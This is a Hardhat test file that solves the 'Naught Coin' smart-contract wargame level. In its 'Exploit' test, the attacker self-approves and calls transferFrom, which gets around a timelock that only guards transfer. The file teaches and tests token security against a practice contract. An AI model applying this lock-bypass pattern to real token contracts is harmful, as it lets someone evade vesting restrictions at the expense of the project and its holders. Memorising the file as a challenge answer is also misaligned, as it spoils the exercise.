const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Naught coin', function () {
    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const Factory = await ethers.getContractFactory('NaughtCoin', deployer);
        this.naughtCoin = await Factory.deploy(attacker.address);
    });
    // The lockdown only applies to transfer and not to the transferFrom function of the ERC20 standard
    it('Exploit', async function () {
        let victimInstance = this.naughtCoin.connect(attacker);
        let attackerBalance = await victimInstance.balanceOf(attacker.address)
        await victimInstance.approve(attacker.address, attackerBalance)
        await victimInstance.transferFrom(attacker.address, victimInstance.address, attackerBalance);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await this.naughtCoin.balanceOf(attacker.address)
        ).to.be.eq(0);
    });
});